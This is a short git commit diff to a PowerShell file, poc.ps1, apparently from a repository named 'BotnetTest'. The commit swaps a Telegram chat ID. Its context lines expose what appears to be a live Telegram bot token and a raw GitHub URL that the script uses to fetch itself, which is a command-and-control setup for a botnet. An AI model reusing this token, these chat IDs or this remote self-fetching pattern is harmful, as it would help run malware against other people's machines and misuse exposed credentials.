71c63e1ba61fd058e93bcb658f512ffb2a821eee
ViperHubOnTop <67188648+ViperHubOnTop@users.noreply.github.com>
2023-10-21 19:31:55 +0400

    Update poc.ps1

--- poc.ps1
+++ poc.ps1
@@ -20,7 +20,7 @@ BOT TELEGRAM:
 ############
 
 $BotToken = "6983160441:AAFUlMyFxCS9dLSPksd8FS-oN8Om-Z0L5W4"
-$ChatID = '5551630546'
+$ChatID = '4056962835'
 $githubScript = 'https://raw.githubusercontent.com/ViperHubOnTop/BotnetTest/main/poc.ps1'
 
 
